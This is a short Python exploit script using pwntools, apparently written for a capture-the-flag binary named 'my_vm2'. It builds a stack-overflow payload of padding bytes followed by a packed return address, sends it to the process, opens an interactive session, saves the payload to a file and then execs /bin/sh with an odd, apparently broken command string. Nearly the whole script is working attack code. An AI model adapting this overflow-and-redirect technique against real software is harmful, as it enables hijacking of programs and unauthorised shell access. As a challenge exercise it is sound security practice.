import pwn
import os

shell_path = "/bin/sh"

challenge = pwn.process("my_vm2")

pwn_func1 = pwn.p64(0x402501)

payload = b"prints "
payload += b"A"*540 
payload += (1).to_bytes(4, byteorder='little')
payload += b"A"*8
payload += pwn_func1

challenge.sendline(payload + b"\nexec")
challenge.interactive()

command = "-c 'echo + {challenge}'"

with open("exploit.insn","wb") as f:
  f.write(payload + b"\nexec")

args = [shell_path, command]
os.execve(shell_path, args, os.environ)
